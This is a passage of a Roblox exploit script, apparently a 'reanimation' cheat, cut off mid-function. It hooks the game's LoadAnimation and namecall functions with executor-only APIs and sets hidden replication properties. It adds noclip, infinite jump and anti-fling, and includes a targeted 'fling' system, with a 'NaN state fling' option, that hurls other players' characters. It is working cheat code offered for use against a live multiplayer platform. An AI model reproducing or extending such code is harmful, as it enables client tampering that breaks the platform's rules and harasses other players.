			local rzoom = self.Zoom
			if self.FPSLocked then
				self.Zoom = 0.5
				rzoom = 0.5
			end
			if self.VRMode then
				input *= Vector3.new(1, 0, 1)
				rzoom *= Reanimate.CharacterScale
				self._Zoom = rzoom
			end
			self._Zoom = rzoom + (self._Zoom - rzoom) * math.exp(-32 * dt)
			local ltm = Reanimate.LocalTransparencyModifier
			local tltm = 0
			local sltm = dt * 3
			if not self.Scriptable then
				if self:IsFirstPerson() then
					tltm = 1
				elseif rzoom < 1.5 * Reanimate.CharacterScale then
					tltm = 0.5
				end
			end
			if math.abs(ltm - tltm) <= sltm then
				ltm = tltm
			elseif ltm < tltm then
				ltm += sltm
			else
				ltm -= sltm
			end
			Reanimate.LocalTransparencyModifier = ltm
			if not Reanimate.ShiftlockEnabled and Reanimate.Shiftlocked then
				Reanimate.Shiftlocked = false
			end
			if Reanimate.Character then
				local targetMouseBehavior = Enum.MouseBehavior.Default
				if self:IsMousePanning() then
					if self:IsMouseLocked() then
						if UserInputService.TouchEnabled then
							targetMouseBehavior = Enum.MouseBehavior.LockCurrentPosition
						else
							targetMouseBehavior = Enum.MouseBehavior.LockCenter
						end
					else
						targetMouseBehavior = Enum.MouseBehavior.LockCurrentPosition
					end
				end
				if UserInputService.MouseBehavior ~= targetMouseBehavior then
					UserInputService.MouseBehavior = targetMouseBehavior
				end
				local targetMouseIcon = ""
				if Reanimate.Shiftlocked then
					targetMouseIcon = "rbxasset://textures/Cursors/CrossMouseIcon.png"
				end
				if UserInputService.MouseIcon ~= targetMouseIcon then
					UserInputService.MouseIcon = targetMouseIcon
				end
				if GameSettings.RotationType ~= Enum.RotationType.MovementRelative then
					GameSettings.RotationType = Enum.RotationType.MovementRelative
				end
				local Humanoid = Reanimate.Character:FindFirstChildOfClass("Humanoid")
				local RootPart = Reanimate.Character:FindFirstChild("HumanoidRootPart")
				if Humanoid and RootPart and Camera.CameraSubject == Humanoid then
					if self.Scriptable then
						Camera.FieldOfView = self.FieldOfView
						Camera.FieldOfViewMode = "Vertical"
					else
						Camera.FieldOfView = 70
						Camera.FieldOfViewMode = "Vertical"
						local newCameraCFrame, newCameraFocus = self.CFrame, self.Focus
						local subjectPosition = RootPart.Position + RootPart.CFrame.UpVector * 1.5
						if not self.VRMode then subjectPosition += RootPart.CFrame.Rotation * Humanoid.CameraOffset end
						local currLookVector = suppliedLookVector or newCameraCFrame.LookVector
						local currPitchAngle = math.asin(currLookVector.Y)
						local constrainedRotateInput = Vector2.new(input.X, math.clamp(input.Y, math.rad(-80) + currPitchAngle, math.rad(80) + currPitchAngle))
						local startCFrame = CFrame.lookAt(Vector3.zero, currLookVector)
						local newLookCFrame = CFrame.Angles(0, -constrainedRotateInput.X, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.Y, 0, 0)
						local newLookVector = newLookCFrame.LookVector
						if self.VRMode then
							newLookVector = (newLookVector * Vector3.new(1, 0, 1)).Unit
							if newLookVector.Magnitude == 0 or newLookVector ~= newLookVector then
								newLookVector = Vector3.zAxis
							end
						end
						if self:IsMouseLocked() and not self:IsFirstPerson() then
							local cameraRelativeOffset = newLookCFrame * Vector3.new(1.7, 0, 0)
							if cameraRelativeOffset == cameraRelativeOffset then
								subjectPosition += cameraRelativeOffset
							end
						end
						newCameraFocus = CFrame.new(subjectPosition)
						local cameraFocusP = newCameraFocus.Position
						if self.VRMode then
							cameraFocusP += newLookVector * 0.5
						end
						newCameraCFrame = CFrame.lookAt(cameraFocusP - newLookVector * self._Zoom, cameraFocusP)
						self.CFrame, self.Focus = newCameraCFrame, newCameraFocus
					end
					Camera.CFrame, Camera.Focus = self.CFrame, self.Focus
				end
				for _,v in Reanimate.CharacterLTMs do
					v.LocalTransparencyModifier = ltm
				end
			end
			pcall(function() CoreGui.TopBarApp.TopBarApp.FullScreenFrame.HurtOverlay.Visible = false end)
		end)
	end
end
Reanimate.CameraLockCharacter = function()
	local RCRootPart = Reanimate.Character and Reanimate.Character:FindFirstChild("HumanoidRootPart")
	if RCRootPart and RCRootPart:IsA("BasePart") then
		local ccf = Reanimate.Camera:GetMovementCFrame()
		local rcf = RCRootPart.CFrame
		local ax, ay, az = ccf:ToEulerAngles(Enum.RotationOrder.YXZ)
		local bx, by, bz = rcf:ToEulerAngles(Enum.RotationOrder.YXZ)
		RCRootPart.CFrame = CFrame.fromEulerAngles(bx, ay, bz, Enum.RotationOrder.YXZ) + rcf.Position
	end
end
Reanimate.CreateCharacter = function(InitCFrame)
	local RC = Reanimate.Character
	local cf = CFrame.new(Camera.Focus.Position)
	if RC then
		local r = RC:FindFirstChild("HumanoidRootPart")
		if r then
			cf = r.CFrame
		end
		RC:Destroy()
	elseif Player.Character then
		local r = Player.Character:FindFirstChild("HumanoidRootPart")
		if r then
			cf = r.CFrame
		end
	end
	if InitCFrame then
		cf = InitCFrame
	end
	Reanimate.Camera.CFrame, Reanimate.Camera.Focus = Camera.CFrame, Camera.Focus
	Reanimate.Camera:OnReset()
	RC = CreateHumanoidCharacter()
	RC.ModelStreamingMode = "Persistent"
	Player.ReplicationFocus = workspace
	local ltmparts = Reanimate.CharacterLTMs
	table.clear(ltmparts)
	local function OnDescendant(v)
		local exist = pcall(function()
			return v.LocalTransparencyModifier
		end)
		if exist then
			table.insert(ltmparts, v)
			local conn = nil
			conn = v.AncestryChanged:Connect(function()
				if not v:IsDescendantOf(RC) then
					local i = table.find(ltmparts, v)
					if i then
						table.remove(ltmparts, i)
					end
					conn:Disconnect()
				end
			end)
		end
	end
	RC.DescendantAdded:Connect(OnDescendant)
	for _,v in RC:GetDescendants() do
		task.spawn(OnDescendant, v)
	end
	RC:ScaleTo(Reanimate.CharacterScale)
	local RCHumanoid, RCRootPart = RC.Humanoid, RC.HumanoidRootPart
	local RCHead, RCTorso, RCRootJoint, RCNeck = RC.Head, RC.Torso, RCRootPart.RootJoint, RC.Torso.Neck
	--[[local Anchor = Instance.new("Part", RCRootPart)
	Anchor.Name = "i can take explosions >:3"
	Anchor.Transparency = 1
	Anchor.Anchored = false
	Anchor.CanCollide = false
	Anchor.CanQuery = false
	Anchor.CanTouch = false
	Anchor.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 0, 0)
	Anchor.Size = Vector3.new(2048, 2048, 2048)
	local AnchorWeld = Instance.new("Weld")]]
	local BodyForce = Instance.new("BodyForce")
	BodyForce.Parent = RCRootPart
	BodyForce.Force = Vector3.zero
	RC.Parent = workspace
	RCRootPart.RootPriority = 67
	RCRootPart.CFrame = cf
	local SafeY = cf.Y
	local IsFloat = false
	local SeatWeld = nil
	local LastJumpOffSeat = 0
	RCHumanoid.Touched:Connect(function(part, limb)
		if Reanimate.SeatSit and part:IsA("Seat") and not RCHumanoid.Sit and os.clock() - LastJumpOffSeat > 2 then
			RCHumanoid.Sit = true
			if SeatWeld ~= nil then
				SeatWeld = SeatWeld:Destroy()
			end
			SeatWeld = Instance.new("Weld")
			SeatWeld.Name = "hell yeah!! :3"
			SeatWeld.Parent = RCRootPart
			SeatWeld.Part0 = part
			SeatWeld.Part1 = RCRootPart
			SeatWeld.C0 = CFrame.new(0, part.Size.Y / 2, 0)
			SeatWeld.C1 = CFrame.new(0, -1.5 * RC:GetScale(), 0)
			Util.LinkDestroyI2C(SeatWeld, RCHumanoid:GetPropertyChangedSignal("Jump"):Connect(function()
				if RCHumanoid.Jump then
					RCHumanoid.Sit = false
					SeatWeld:Destroy()
				end
			end))
		end
		if part.Name == "Handle" and part.Parent:IsA("Tool") and not part.Parent.Parent:FindFirstChildOfClass("Humanoid") then
			if Reanimate.ToolGrab then
				if Player.Character then
					local Humanoid = Player.Character:FindFirstChildOfClass("Humanoid")
					if Humanoid then
						Humanoid:EquipTool(part.Parent)
					end
				end
			end
		end
	end)
	RCHumanoid.Seated:Connect(function(active)
		if not active then
			if SeatWeld ~= nil then
				SeatWeld = SeatWeld:Destroy()
			end
			LastJumpOffSeat = os.clock()
		end
	end)
	local LastJump = false
	local RCP = RaycastParams.new()
	RCP.RespectCanCollide = true
	RCP.FilterType = Enum.RaycastFilterType.Exclude
	RCP.FilterDescendantsInstances = {RC}
	local noclipStates = {"Running", "Jumping", "Freefall", "Landed", "Climbing", "Swimming"}
	local fallingStates = {"Jumping", "Freefall", "PlatformStanding", "Physics", "Ragdoll", "GettingUp", "Seated", "Flying", "FallingDown"}
	local LastSafest = RCRootPart.CFrame
	local CMove, CJump = Vector3.zero, false
	Util.LinkDestroyI2C(RC, RunService.PreAnimation:Connect(function(dt)
		CMove, CJump = Reanimate.Control.Move, Reanimate.Control.Jump
		local CamCF = Reanimate.Camera:GetMovementCFrame()
		local _,x,_ = CamCF:ToEulerAngles(Enum.RotationOrder.YXZ)
		local MoveCF = CFrame.Angles(0, x, 0)
		pcall(sethiddenproperty, RCRootPart, "PhysicsRepRootPart", nil)
		local scale = Reanimate.CharacterScale
		if scale ~= RC:GetScale() then
			RC:ScaleTo(scale)
		end
		local force = Vector3.zero
		local RCHumanoidState = RCHumanoid:GetState().Name
		if RCHumanoidState == "Swimming" then
			force += Vector3.new(0, workspace.Gravity * 0.5, 0) * RCRootPart.AssemblyMass
		end
		local gravaff = not not table.find(fallingStates, RCHumanoidState)
		if gravaff then
			if Reanimate.ScaleGravity and not RCRootPart:IsGrounded() then
				force += Vector3.new(0, -workspace.Gravity * (scale - 1), 0) * RCRootPart.AssemblyMass
			end
		end
		if LastJump ~= CJump then
			if CJump then
				if Reanimate.InfiniteJump and RCHumanoid:GetState() == Enum.HumanoidStateType.Freefall and RCHumanoid.JumpPower > 0 then
					RCRootPart.Velocity = Vector3.new(
						RCRootPart.Velocity.X, RCHumanoid.JumpPower, RCRootPart.Velocity.Z
					)
				end
			end
		end
		LastJump = CJump
		local TargetCameraPosition = RCRootPart.CFrame * Vector3.new(0, 1.5 * scale, 0)
		if RCRootJoint.Active then
			TargetCameraPosition = RCTorso.CFrame * Vector3.new(0, 1.5 * scale, 0)
			if RCNeck.Active then
				TargetCameraPosition = RCHead.Position
			end
		end
		local TargetCameraOffset = (RCRootPart.CFrame * CFrame.new(0, 1.5, 0)):PointToObjectSpace(TargetCameraPosition)
		if not Reanimate.SmoothCam then
			TargetCameraOffset = Vector3.new(0, -1.5, 0) + Vector3.new(0, 1.5, 0) * scale
		end
		RCHumanoid.CameraOffset = TargetCameraOffset:Lerp(RCHumanoid.CameraOffset, math.exp(-9.8 * dt))
		if RCHumanoidState == "Swimming" then
			RCHumanoid:Move(CamCF:VectorToWorldSpace(CMove))
		else
			RCHumanoid:Move(MoveCF:VectorToWorldSpace(CMove))
		end
		RCHumanoid.Jump = CJump
		BodyForce.Force = force
		if RCRootPart.Position.Y < FallenPartsDestroyHeight + 3 * Reanimate.CharacterScale then
			RCRootPart.CFrame = LastSafest
			RCRootPart.Velocity = Vector3.new(0, 50, 0)
			RCRootPart.RotVelocity = Vector3.zero
		end
	end))
	Util.LinkDestroyI2C(RC, RunService.PreSimulation:Connect(function(dt)
		local RCHumanoidState = RCHumanoid:GetState().Name
		local clip = not table.find(noclipStates, RCHumanoidState)
		for _,v in RC:GetChildren() do
			if v:IsA("BasePart") then
				v.CanCollide = clip or (not Reanimate.Noclip and v == RCRootPart)
			end
		end
	end))
	Util.LinkDestroyI2C(RC, RunService.PostSimulation:Connect(function(dt)
		RCHumanoid.Jump = CJump
		local tcf, pos = RCRootPart.CFrame.Rotation, RCRootPart.CFrame.Position
		local RCHumanoidState = RCHumanoid:GetState().Name
		local safe = true
		local void = true
		for i=1, 8 do
			local off = CFrame.Angles(0, (i / 4) * math.pi, 0):VectorToWorldSpace(Vector3.new(0, 0, -0.5))
			local r = workspace:Raycast(RCRootPart.Position + off, Vector3.new(0, -65536, 0), RCP)
			if r then
				void = false
				if r.Distance > 3 * Reanimate.CharacterScale + 8 + RCHumanoid.HipHeight then
					safe = false
				end
			else
				safe = false
			end
		end
		if safe then
			LastSafest = RCRootPart.CFrame
		end
		if RCHumanoidState == "Climbing" or not void then
			SafeY = pos.Y
			IsFloat = false
		else
			IsFloat = true
		end
		if Reanimate.PatchmaVoidFloat and IsFloat then
			pos = Vector3.new(pos.X, SafeY, pos.Z)
			RCRootPart.Velocity *= Vector3.new(1, 0, 1)
		end
		RCRootPart.CFrame = tcf + pos
		if Reanimate:ShouldRotationType() then
			Reanimate:CameraLockCharacter()
		end
	end))
	Reanimate.Character = RC
	_G_Uhhhhhh.Character = RC
end
Reanimate.DestroyCharacter = function()
	if Reanimate.Character then
		Reanimate.Character = Reanimate.Character:Destroy()
		_G_Uhhhhhh.Character = nil
	end
end

do
	local AntiflingHumanoids = {}
	local AntiflingBaseParts = {}
	local OnStepped = function()
		for i,v in AntiflingBaseParts do
			if v:IsDescendantOf(workspace) then
				if v.CanCollide then v.CanCollide = false end
				v.AssemblyLinearVelocity, v.AssemblyAngularVelocity = Vector3.zero, Vector3.zero
			else
				table.remove(AntiflingBaseParts, i)
			end
		end
		for i,v in AntiflingHumanoids do
			if v:IsDescendantOf(workspace) then
				if v.EvaluateStateMachine then v.EvaluateStateMachine = false end
			else
				table.remove(AntiflingHumanoids, i)
			end
		end
	end
	RunService.PreAnimation:Connect(OnStepped)
	RunService.PreSimulation:Connect(OnStepped)
	RunService.Stepped:Connect(OnStepped)
	local OnBasePart = function(v)
		if v:IsA("BasePart") then
			v.CanCollide = false
			if not table.find(AntiflingBaseParts, v) then
				table.insert(AntiflingBaseParts, v)
			end
		end
		if v:IsA("Humanoid") then
			v.EvaluateStateMachine = false
			if not table.find(AntiflingHumanoids, v) then
				table.insert(AntiflingHumanoids, v)
			end
		end
	end
	local OnCharacter = function(character)
		character.DescendantAdded:Connect(OnBasePart)
		for _,v in character:GetDescendants() do
			OnBasePart(v)
		end
	end
	local OnPlayer = function(player)
		if player == Player then return end
		player.CharacterAdded:Connect(OnCharacter)
		if player.Character then OnCharacter(player.Character) end
	end
	Players.PlayerAdded:Connect(OnPlayer)
	for _,player in Players:GetPlayers() do
		OnPlayer(player)
	end
end

local HumanoidLASetHookState
if ismissing(hookmetamethod) or ismissing(hookfunction) then
	HumanoidLASetHookState = function(hooked) end
else
	local LoadAnimation_old = nil
	local function LoadAnimation_new(animation)
		local char = Instance.new("Model")
		char.Parent = workspace
		local hum = Instance.new("Humanoid")
		hum.Parent = char
		local anim = LoadAnimation_old(hum, animation)
		hum.Parent = nil
		char:Destroy()
		--warn("LoadAnimation prevented!")
		return anim
	end
	local LoadAnimation_nc = nil
	local _HumanoidDummy = Instance.new("Humanoid")
	local _HumanoidLA = _HumanoidDummy.LoadAnimation
	local newloadanimation = newcclosure(function(self, animation)
		if not checkcaller() and typeof(self) == "Instance" and (self:IsA("Humanoid") or self:IsA("Animator")) and typeof(animation) == "Instance" and animation:IsA("Animation") then
			return LoadAnimation_new(animation)
		end
		return LoadAnimation_old(self, animation)
	end)
	local newnamecall = newcclosure(function(...)
		local method = getnamecallmethod()
		if not checkcaller() and method and (method == "LoadAnimation" or method == "loadAnimation") then
			local self, animation = ...
			if typeof(self) == "Instance" and (self:IsA("Humanoid") or self:IsA("Animator")) and typeof(animation) == "Instance" and animation:IsA("Animation") then
				return LoadAnimation_new(animation)
			end
		end
		return LoadAnimation_nc(...)
	end)
	HumanoidLASetHookState = function(hooked)
		if hooked then
			if not LoadAnimation_old then
				LoadAnimation_old = hookfunction(_HumanoidLA, clonefunction(newloadanimation))
			end
			if not LoadAnimation_nc then
				LoadAnimation_nc = hookmetamethod(_HumanoidDummy, "__namecall", clonefunction(newnamecall))
			end
		else
			if LoadAnimation_old then
				hookfunction(_HumanoidLA, LoadAnimation_old)
				LoadAnimation_old = nil
			end
			if LoadAnimation_nc then
				hookmetamethod(_HumanoidDummy, "__namecall", LoadAnimation_nc)
				LoadAnimation_nc = nil
			end
		end
	end
end

Util.SetMotor6DTransform = function(motor, transform)
	local name = motor.Name
	motor.MaxVelocity = 9e9
	local _, _, angle = transform:ToEulerAngles(Enum.RotationOrder.ZYX)
	motor.DesiredAngle = angle
	motor:SetDesiredAngle(angle)
	local axis, angle = transform:ToAxisAngle()
	local newangle = axis * angle
	pcall(sethiddenproperty, motor, "ReplicateCurrentOffset6D", transform.Position)
	pcall(sethiddenproperty, motor, "ReplicateCurrentAngle6D", newangle)
end
Util.SetMotor6DOffset = function(motor, offset)
	Util.SetMotor6DTransform(motor, motor.C0:Inverse() * offset * motor.C1)
end

Util.ShowPartHitbox = function(part)
	local w = Instance.new("WireframeHandleAdornment")
	w.Name = "TempWireframe"
	w.Adornee = part
	w.Color3 = Color3.new(0, 1, 0)
	w.Transparency = 0
	w.ZIndex = 10
	w.AlwaysOnTop = true
	w.Thickness = 1
	w.Parent = SCREENGUI
	local hs = part.Size / 2
	local verts = {
		Vector3.new(-hs.X, -hs.Y, -hs.Z),
		Vector3.new( hs.X, -hs.Y, -hs.Z),
		Vector3.new( hs.X,  hs.Y, -hs.Z),
		Vector3.new(-hs.X,  hs.Y, -hs.Z),
		Vector3.new(-hs.X, -hs.Y,  hs.Z),
		Vector3.new( hs.X, -hs.Y,  hs.Z),
		Vector3.new( hs.X,  hs.Y,  hs.Z),
		Vector3.new(-hs.X,  hs.Y,  hs.Z),
	}
	w:AddLine(verts[1], verts[2])
	w:AddLine(verts[2], verts[3])
	w:AddLine(verts[3], verts[4])
	w:AddLine(verts[4], verts[1])
	w:AddLine(verts[5], verts[6])
	w:AddLine(verts[6], verts[7])
	w:AddLine(verts[7], verts[8])
	w:AddLine(verts[8], verts[5])
	w:AddLine(verts[1], verts[5])
	w:AddLine(verts[2], verts[6])
	w:AddLine(verts[3], verts[7])
	w:AddLine(verts[4], verts[8])
	Debris:AddItem(w, 1)
end

local RIGHTGRIP_C0 = CFrame.new(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0)
Util.PredictionFling = function(target)
	if typeof(target) == "Instance" then
		if target:IsA("Model") then
			target = target:FindFirstChild("HumanoidRootPart") or target.PrimaryPart or target:FindFirstChildWhichIsA("BasePart")
		end
		if target and target:IsA("BasePart") then
			if not target:IsDescendantOf(workspace) then
				return CFrame.identity, true
			end
			local t = os.clock()
			local t2 = math.sin(t * 15) + 1
			local cf = target.CFrame * CFrame.Angles(1.57, 0, 0)
			if not Reanimate.UsePhysicsRepRootPart then
				cf += target.AssemblyLinearVelocity * t2 + Vector3.new(0, -workspace.Gravity * 0.5 * t2 * t2 + math.sin(t * 60), 0)
				if cf.Position.Y < target.Position.Y - 1 then
					cf = cf.Rotation + Vector3.new(cf.Position.X, target.Position.Y - 1, cf.Position.Z)
				end
			end
			--cf += Vector3.new(0, -0.5, 0)
			local oldpos = target:GetAttribute("_Uhhhhhh_LastPosition")
			if not oldpos then
				oldpos = target.Position
				target:SetAttribute("_Uhhhhhh_LastPosition", oldpos)
			end
			if (target.Position - oldpos).Magnitude > 200 then
				target:SetAttribute("_Uhhhhhh_LastPosition", nil)
				return cf, true
			end
			return cf, false
		end
	end
	if typeof(target) == "CFrame" then
		return target, false
	end
	if typeof(target) == "Vector3" then
		return CFrame.new(target), false
	end
	return CFrame.identity, true
end
Util.PredictionFlingPart = function(target)
	if typeof(target) == "Instance" then
		if target:IsA("Model") then
			target = target:FindFirstChild("HumanoidRootPart") or target.PrimaryPart or target:FindFirstChildWhichIsA("BasePart")
		end
		if target and target:IsA("BasePart") then
			return target
		end
	end
end

SaveData.Reanimator = SaveData.Reanimator or {}

local LimbReanimator = {}
LimbReanimator.Name = "Limbs"
SaveData.Reanimator.LimbMode = SaveData.Reanimator.LimbMode or 0
SaveData.Reanimator.LimbVelocity = SaveData.Reanimator.LimbVelocity or 0
SaveData.Reanimator.LimbInitMode = SaveData.Reanimator.LimbInitMode or 2
SaveData.Reanimator.LimbReplicateFPS10 = not not SaveData.Reanimator.LimbReplicateFPS10
SaveData.Reanimator.LimbRoleplay = not not SaveData.Reanimator.LimbRoleplay
SaveData.Reanimator.LimbUseNaNFling = not not SaveData.Reanimator.LimbUseNaNFling
LimbReanimator.Mode = SaveData.Reanimator.LimbMode
-- 0 = hide rootpart (defaults to 2 when streaming is enabled)
-- 1 = put rootpart just under void (defaults to 2 when streaming is enabled)
-- 2 = keep rootpart streamed, puts rootpart below character
-- 3 = currentangle styled
-- 4 = rootpart is torso (most interpolated mode)
LimbReanimator.Velocity = SaveData.Reanimator.LimbVelocity
-- 0 = no velocity
-- 1 = copy from fake character
-- 2 = fling-y velocity
LimbReanimator.InitMode = SaveData.Reanimator.LimbInitMode
-- 0 = just reset
-- 1 = time permadeath, and reset
-- 2 = time permadeath, "without reset"
LimbReanimator.ReplicateFPS10 = SaveData.Reanimator.LimbReplicateFPS10
LimbReanimator.FlingEnabled = not SaveData.Reanimator.LimbRoleplay
LimbReanimator.UseNaNFling = SaveData.Reanimator.LimbUseNaNFling
LimbReanimator.FlingTargets = {}
LimbReanimator._TempNotFling = {}
function LimbReanimator.ShowHitboxes()
	Util.UINotify("Just a useless option")
	pcall(function()
		Util.ShowPartHitbox(Player.Character.HumanoidRootPart)
	end)
end
function LimbReanimator.Fling(target, duration)
	if not LimbReanimator.FlingEnabled then return end
	if not target then return false end
	for _,v in LimbReanimator.FlingTargets do
		if v.Target == target then
			return false
		end
	end
	if target == Reanimate.Character then return false end
	if target == Player.Character then return false end
	if typeof(target) == "Instance" then
		if LimbReanimator._TempNotFling[target] then return end
		LimbReanimator._TempNotFling[target] = true
		task.delay(1, function()
			LimbReanimator._TempNotFling[target] = nil
		end)
	end
	table.insert(LimbReanimator.FlingTargets, {
		Target = target,
		Duration = duration
	})
	if typeof(target) == "Instance" then
		if target:IsA("Model") then
			local h = Util.Instance("Highlight")
			h.Adornee = target
			h.FillColor = Color3.new(1, 0, 0)
			h.OutlineColor = Color3.new(1, 0, 0)
			h.FillTransparency = 0.5
			h.OutlineTransparency = 0
			h.Parent = target
			TweenService:Create(h, TweenInfo.new(5), {
				FillTransparency = 1,
				OutlineTransparency = 1
			}):Play()
			game.Debris:AddItem(h, 5)
		end
	end
	return true
end
function LimbReanimator.SetRootPartMode(mode)
	assert(typeof(mode) == "number")
	LimbReanimator.Mode = mode
end
function LimbReanimator.Config(parent)
	UI.CreateText(parent, "as mentioned in the README, this only works for SOME games,\nbecause 'modern' games create the Animator automatically which breaks limb reanimation", 10, Enum.TextXAlignment.Center)
	local dmode = UI.CreateDropdown(parent, "RootPart Mode", {"RootPart in very void", "RootPart in void", "Keep RootPart Streamed", "CurrentAngle Style", "RootPart is Torso"}, LimbReanimator.Mode + 1)
	local dvel = UI.CreateDropdown(parent, "RootPart Velocity", {"No Velocity", "Follow Character", "Fling-like"}, LimbReanimator.Velocity + 1)
	local dinit = UI.CreateDropdown(parent, "Init Mode", {"Reset Character", "CDSB + Reset", "CDSB + SSE + Kill"}, LimbReanimator.InitMode + 1)
	dmode.Changed:Connect(function(val)
		LimbReanimator.Mode = val - 1
		SaveData.Reanimator.LimbMode = val - 1
	end)
	dvel.Changed:Connect(function(val)
		LimbReanimator.Velocity = val - 1
		SaveData.Reanimator.LimbVelocity = val - 1
	end)
	dinit.Changed:Connect(function(val)
		LimbReanimator.InitMode = val - 1
		SaveData.Reanimator.LimbInitMode = val - 1
	end)
	UI.CreateSwitch(parent, "Show me how I look!", LimbReanimator.ReplicateFPS10).Changed:Connect(function(val)
		LimbReanimator.ReplicateFPS10 = val
		SaveData.Reanimator.LimbReplicateFPS10 = val
	end)
	UI.CreateSwitch(parent, "Target Fling Enabled", LimbReanimator.FlingEnabled).Changed:Connect(function(val)
		LimbReanimator.FlingEnabled = val
		SaveData.Reanimator.LimbRoleplay = not val
	end)
	UI.CreateText(parent, "vvv touch player = they lose ownership vvv", 10, Enum.TextXAlignment.Center)
	UI.CreateSwitch(parent, "Use NaN State Fling", LimbReanimator.UseNaNFling).Changed:Connect(function(val)
		LimbReanimator.UseNaNFling = val
		SaveData.Reanimator.LimbUseNaNFling = val
	end)
	Util.LinkDestroyI2C(dmode, RunService.Heartbeat:Connect(function()
		dmode.Value = LimbReanimator.Mode + 1
		dvel.Value = LimbReanimator.Velocity + 1
		dinit.Value = LimbReanimator.InitMode + 1
	end))
end
function LimbReanimator.Start()
	local LimbNames = {"Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}
	local rootposition = Vector3.new(
		math.random(-65536, 65536),
		math.random(-70000, -60000),
		math.random(-65536, 65536)
	)
	local rootposition2 = Vector3.new(
		math.random(-2048, 2048),
		math.random(-500, -100) + FallenPartsDestroyHeight,
		math.random(-2048, 2048)
	)
	local InitCFrame = nil
	if Player.Character then
		local h = Player.Character:FindFirstChildOfClass("Humanoid")
		if h and h.RootPart then
			local r = h.RootPart
			InitCFrame = r.CFrame
			if h:GetState() ~= Enum.HumanoidStateType.Dead then
				h:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				h:ChangeState(Enum.HumanoidStateType.Dead)
			end
		end
	end

	local LimbMapping = loadstring(readfile("UhhhhhhReanim/BuiltinModules/d_limbmap.lua"))()

	local FakeTools = {}
	local function CreateFakeTool()
		local FakeTool = Instance.new("Tool")
		FakeTool.Name = "faketool"
		local FakeToolHandle = Instance.new("Part")
		FakeToolHandle.Name = "Handle"
		FakeToolHandle.Transparency = 1
		FakeToolHandle.Color = Color3.new(0, 0, 1)
		FakeToolHandle.CanCollide = false
		FakeToolHandle.Massless = true
		FakeToolHandle.Parent = FakeTool
		FakeTool.Parent = Reanimate.Character
		local RightGrip = Instance.new("Weld")
		RightGrip.Name = "RightGrip"
		RightGrip.Parent = FakeToolHandle
		RightGrip.Part0 = Reanimate.Character and Reanimate.Character:FindFirstChild("Right Arm")
		RightGrip.Part1 = FakeToolHandle
		RightGrip.C0 = RIGHTGRIP_C0
		Util.LinkDestroyI2C(FakeTool, FakeTool:GetPropertyChangedSignal("Grip"):Connect(function()
			RightGrip.C1 = FakeTool.Grip
		end))
		RightGrip.C1 = FakeTool.Grip
		return FakeTool
	end

	local BaseParts = {}
	local UnknownMotor6Ds = {}
	local CharOnDesc = function(v)
		if v:IsA("BasePart") then
			if not table.find(BaseParts, v) then
				table.insert(BaseParts, v)
				v.CanCollide = false
				v:GetPropertyChangedSignal("CanCollide"):Connect(function()
					if v.CanCollide then v.CanCollide = false end
				end)
			end
		elseif v:IsA("Motor6D") then
			repeat task.wait() until (not v:IsDescendantOf(workspace)) or (v.Part0 and v.Part1)
			if not v:IsDescendantOf(workspace) then return end
			local p0, p1 = v.Part0, v.Part1
			if p0 and p1 then
				p0, p1 = p0.Name, p1.Name
				for _,map in LimbMapping do
					if map.Part0 == p0 and map.Part1 == p1 then
						map.Reference = v
						return
					end
				end
			end
			table.insert(UnknownMotor6Ds, v)
		elseif v:IsA("Animator") then
			task.defer(v.Destroy, v)
		elseif v:IsA("LocalScript") and v.Parent == Player.Character then
			v.Enabled = false
			v:GetPropertyChangedSignal("Enabled"):Connect(function()
				if v.Enabled then v.Enabled = false end
			end)
			v:GetPropertyChangedSignal("Disabled"):Connect(function()
				if not v.Disabled then v.Disabled = true end
			end)
		elseif v:IsA("Tool") and v.Parent == Player.Character then
			if not FakeTools[v] then
				FakeTools[v] = true
				local fake = CreateFakeTool()
				fake.Grip = v.Grip
				local h = v:FindFirstChild("Handle")
				if h ~= nil then
					fake.Handle.Size = h.Size
				end
				Util.LinkDestroyI2C(fake, RunService.PreSimulation:Connect(function()
					if v.Parent == Player.Character then
						fake.Grip = v.Grip
						local h = v:FindFirstChild("Handle")
						if h ~= nil then
							fake.Handle.Size = h.Size
						end
					else
						fake:Destroy()
						FakeTools[v] = nil
					end
				end))
				Util.LinkDestroyI2C(fake, v.ChildAdded:Connect(function(v)
					if v.ClassName == "StringValue" and v.Name == "toolanim" then
						local w = Instance.new("StringValue")
						w.Name = "toolanim"
						w.Value = v.Value
						w.Parent = fake
						Debris:AddItem(v, 1)
						Debris:AddItem(w, 1)
					end
				end))
				fake.Handle.Touched:Connect(function(t)
					local h = v:FindFirstChild("Handle")
					if h and t and h:IsDescendantOf(workspace) and t:IsDescendantOf(workspace) then
						h.CanTouch = true
						pcall(firetouchinterest, h, t, 0)
					end
				end)
				fake.Handle.TouchEnded:Connect(function(t)
					local h = v:FindFirstChild("Handle")
					if h and t and h:IsDescendantOf(workspace) and t:IsDescendantOf(workspace) then
						h.CanTouch = true
						pcall(firetouchinterest, h, t, 1)
					end
				end)
			end
		end
	end
	local lastspawn = 0
	local CharConn = Player.CharacterAdded:Connect(function(character)
		local camcfr = Camera.CFrame
		RunService.PreRender:Once(function()
			RunService.PreAnimation:Wait()
			Camera.CFrame = camcfr
		end)
		lastspawn = os.clock()
		table.clear(BaseParts)
		table.clear(UnknownMotor6Ds)
		for _,map in LimbMapping do
			map.Reference = nil
		end
		character.DescendantAdded:Connect(CharOnDesc)
		for _,v in character:GetDescendants() do
			task.spawn(CharOnDesc, v)
		end
		local humanoid = character:WaitForChild("Humanoid", 5)
		local stupid = humanoid:FindFirstChildWhichIsA("Animator")
		if stupid then
			stupid:Destroy()
		end
		if not Reanimate.UseLoadAnimationHook then
			stupid = character:FindFirstChild("Animate")
			while not stupid do
				character.ChildAdded:Wait()
				stupid = character:FindFirstChild("Animate")
			end
			stupid:Destroy()
		end
	end)
	Player.CharacterAdded:Wait()
	Reanimate.CreateCharacter(InitCFrame)

	local lastrep = 0
	local function UpdateTransforms(ReanimCharacter, RootPart, rootcf, rootvel, flingtarget, flingcf)
		if not RootPart:IsGrounded() then
			if flingtarget then
				if LimbReanimator.UseNaNFling then
					RootPart.CFrame = CFrame.new(flingcf.Position + Vector3.new(0, 0, math.random(0, 1) * 0.005)) * CFrame.Angles(0, os.clock() * 15, 0)
					RootPart.Velocity, RootPart.RotVelocity = Vector3.zero, Vector3.zero
				else
